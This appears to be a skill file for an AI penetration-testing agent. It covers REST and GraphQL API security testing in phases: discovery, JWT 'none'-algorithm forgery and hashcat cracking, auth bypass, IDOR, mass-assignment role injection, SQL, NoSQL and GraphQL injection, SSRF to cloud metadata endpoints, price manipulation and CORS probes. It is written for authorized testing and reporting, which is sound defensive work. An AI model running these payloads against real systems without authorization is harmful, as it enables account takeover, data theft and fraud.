---
name: api-security
description: "REST and GraphQL API security testing patterns. Covers authentication bypass, injection, IDOR, mass assignment, BOLA, rate limiting, and business logic attacks."
---

# API Security Testing Skill

Comprehensive security testing patterns for REST APIs and GraphQL endpoints.

## Phase 1: API Discovery

### 1.1 Common API Path Discovery

```bash
gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt -t 50
```

Check standard paths manually:
```bash
for path in /api /rest /graphql /v1 /v2 /swagger /openapi.json /swagger.json /api-docs /api/swagger /api/v1 /api/v2 /.well-known/openapi; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target${path}")
  echo "${path}: ${code}"
done
```

### 1.2 OpenAPI/Swagger Spec Extraction

```bash
# Try common OpenAPI spec locations
for path in /openapi.json /swagger.json /api-docs /api/swagger.json /v2/api-docs /v3/api-docs; do
  result=$(curl -sk "https://target${path}" 2>/dev/null | head -c 100)
  if echo "$result" | grep -qi "swagger\|openapi\|paths"; then
    echo "FOUND: https://target${path}"
    curl -sk "https://target${path}" > /workspace/openapi-spec.json
  fi
done
```

### 1.3 GraphQL Introspection

```bash
# Test introspection query
curl -sk -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
```

If introspection is enabled:
```bash
# Full schema dump
curl -sk -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name } } type { name kind ofType { name } } } } } }"}' \
  > /workspace/graphql-schema.json
```

## Phase 2: Authentication & Authorization

### 2.1 JWT Analysis

```bash
# Decode JWT header and payload
TOKEN="eyJ..."
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Test JWT weaknesses:
```bash
# Test "none" algorithm bypass
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=')
print(header.decode() + '.' + payload.decode() + '.')
"
```

```bash
# Test with weak secret using hashcat
echo "$TOKEN" > /tmp/jwt.txt
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --force
```

### 2.2 Auth Bypass Patterns

```bash
# Test endpoints without auth
curl -sk https://target/api/Users
curl -sk https://target/api/admin/users

# Test with empty/malformed tokens
curl -sk -H "Authorization: Bearer " https://target/api/Users
curl -sk -H "Authorization: Bearer invalid" https://target/api/Users
curl -sk -H "Authorization: Bearer null" https://target/api/Users

# Test HTTP method override
curl -sk -X GET https://target/api/admin -H "X-HTTP-Method-Override: GET"
curl -sk -X POST https://target/api/admin -H "X-HTTP-Method: GET"
```

### 2.3 IDOR / BOLA (Broken Object Level Authorization)

Use `shannon_idor_test` with auto mode:
```
shannon_idor_test target="https://target" mode="auto" auth_token="Bearer eyJ..." own_user_id=1
```

Or manually test specific endpoints:
```bash
# Authenticated as User 1, access User 2's data
TOKEN="Bearer eyJ..."
for id in 1 2 3 4 5; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: $TOKEN" "https://target/api/Users/$id")
  echo "User $id: HTTP $code"
done
```

### 2.4 Mass Assignment / BOPLA

```bash
# Test if API accepts extra fields that should be admin-only
# Registration with role injection
curl -sk -X POST https://target/api/Users \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test1234","role":"admin","isAdmin":true}'

# Profile update with privilege escalation
curl -sk -X PUT https://target/api/Users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","role":"admin","isVerified":true}'
```

## Phase 3: Injection Testing

### 3.1 SQL Injection

```bash
# Test all parameters
sqlmap -u "https://target/api/Products?q=test" --batch --level=3 --risk=2

# POST body injection
sqlmap -u "https://target/api/login" --data='{"email":"*","password":"*"}' --batch --level=3

# Header injection
sqlmap -u "https://target/api/Users" -H "Authorization: Bearer *" --batch --level=3
```

### 3.2 NoSQL Injection

```bash
# MongoDB operator injection
curl -sk -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":{"$ne":""}}'

curl -sk -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# Regex-based extraction
curl -sk -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$regex":"admin.*"},"password":{"$ne":""}}'
```

### 3.3 GraphQL Injection

```bash
# SQL injection via GraphQL variables
curl -sk -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(id: \"1 OR 1=1\") { id email } }"}'

# Nested query DoS (query depth attack)
curl -sk -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { posts { author { posts { author { posts { title } } } } } } }"}'

# Batch queries
curl -sk -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id: 1) { email } }"},{"query":"{ user(id: 2) { email } }"},{"query":"{ user(id: 3) { email } }"}]'
```

### 3.4 SSRF via API Parameters

```bash
# Test URL-accepting parameters
curl -sk -X PUT https://target/api/profile/image \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"imageUrl":"http://localhost:3000/api/Users"}'

curl -sk -X POST https://target/api/import \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Cloud metadata endpoints
for endpoint in \
  "http://169.254.169.254/latest/meta-data/" \
  "http://metadata.google.internal/computeMetadata/v1/" \
  "http://169.254.169.254/metadata/instance"; do
  curl -sk -X POST https://target/api/webhook \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"$endpoint\"}"
done
```

## Phase 4: Business Logic Testing

### 4.1 Price Manipulation

```bash
# Negative price
curl -sk -X PUT https://target/api/Products/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"price":-100}'

# Negative quantity
curl -sk -X POST https://target/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"BasketId":1,"quantity":-5}'

# Zero price
curl -sk -X PUT https://target/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"price":0}'
```

### 4.2 Rate Limiting

Use `shannon_rate_limit_test`:
```
shannon_rate_limit_test action="burst" target="https://target/api/login" requests=50 body='{"email":"test@test.com","password":"wrong"}'
```

### 4.3 Race Conditions

Use `shannon_rate_limit_test`:
```
shannon_rate_limit_test action="race" target="https://target/api/apply-coupon" concurrent=10 body='{"coupon":"SAVE50"}' headers='{"Authorization":"Bearer eyJ..."}'
```

## Phase 5: Information Disclosure

### 5.1 Error Message Analysis

```bash
# Trigger detailed errors
curl -sk "https://target/api/Users/undefined"
curl -sk "https://target/api/Users/-1"
curl -sk "https://target/api/Users/[object Object]"
curl -sk -X POST https://target/api/login -d '{invalid json'

# Check for stack traces
curl -sk "https://target/api/nonexistent" | grep -i "stack\|trace\|error\|exception\|at /"
```

### 5.2 Security Headers Check

```bash
curl -sk -I https://target/api/ | grep -iE "x-frame|x-content|strict-transport|content-security|x-xss|referrer-policy|access-control"
```

Expected headers:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Strict-Transport-Security: max-age=31536000`
- `Content-Security-Policy: ...`
- `Referrer-Policy: no-referrer`

### 5.3 CORS Misconfiguration

```bash
# Test with arbitrary origin
curl -sk -I -H "Origin: https://evil.com" https://target/api/Users
# Check: Access-Control-Allow-Origin should NOT be https://evil.com

# Test with null origin
curl -sk -I -H "Origin: null" https://target/api/Users

# Test if credentials allowed with wildcard
curl -sk -I -H "Origin: https://evil.com" https://target/api/Users | grep -i "access-control-allow-credentials"
```

### 5.4 Version & Debug Endpoints

```bash
for path in /metrics /actuator /actuator/health /actuator/env /debug /trace /status /info /health /api/debug /api/status /api/health /api/version; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target${path}")
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "FOUND: ${path} (HTTP ${code})"
  fi
done
```

## Phase 6: Reporting

Use `shannon_correlate_findings` to auto-map findings:
```
shannon_correlate_findings findings='[
  {"title":"Missing Rate Limiting on Login","description":"Login endpoint accepts unlimited requests","evidence":"50 requests sent, all returned 200","severity_hint":"high","endpoint":"/api/login"},
  {"title":"IDOR on User Profile","description":"User A can read User B profile","evidence":"GET /api/Users/2 returns data with User 1 token","severity_hint":"high","endpoint":"/api/Users/{id}"}
]'
```

Then generate final report:
```
shannon_report target="target.com" findings="<paste all findings>" format="markdown"
```

## Workflow Summary

1. **Discover API** -- Find endpoints via gobuster, OpenAPI spec, or JS analysis
2. **Map authentication** -- Understand JWT/session/API key auth model
3. **Test auth bypass** -- No-auth, empty token, method override
4. **Test IDOR/BOLA** -- Cross-user access on all resource endpoints
5. **Test injection** -- SQLi, NoSQLi, GraphQL injection, SSRF
6. **Test business logic** -- Price manipulation, race conditions, rate limiting
7. **Check information disclosure** -- Errors, headers, CORS, debug endpoints
8. **Correlate and report** -- Map to OWASP/CWE/CVSS and generate report
